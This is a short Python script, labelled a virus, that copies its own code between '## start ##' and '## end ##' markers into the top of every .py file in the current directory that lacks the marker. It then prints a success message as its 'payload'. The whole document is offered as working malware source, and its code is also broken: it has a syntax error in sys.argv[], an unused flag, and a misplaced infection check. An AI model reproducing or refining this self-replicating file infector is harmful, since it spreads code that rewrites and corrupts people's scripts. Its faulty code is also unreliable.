## start ##
import sys,glob
code=[]
with open(sys.argv[],'r') as f:
    lines=f.readlines()
virus_area=False
for line in lines:
   if line=="## start ##\n":
       virus_area=True
   code.append(line)
   if line=="## end ##":
       break
p_files=glob.glob("*.py")
for file in p_files:
    with open(file,'r') as f:
        script_code = f.readlines()
    inf=False
    for line in script_code:
       if line=="## start ##\n":
           inf=True
           break
       if not inf:
           final=[]
           final.extend(code)
           final.extend('\n')
           final.extend(script_code)
           with open(file,'w') as f:
               f.writelines(final)
#payload
print("virus is succesfull")                                  
## end ##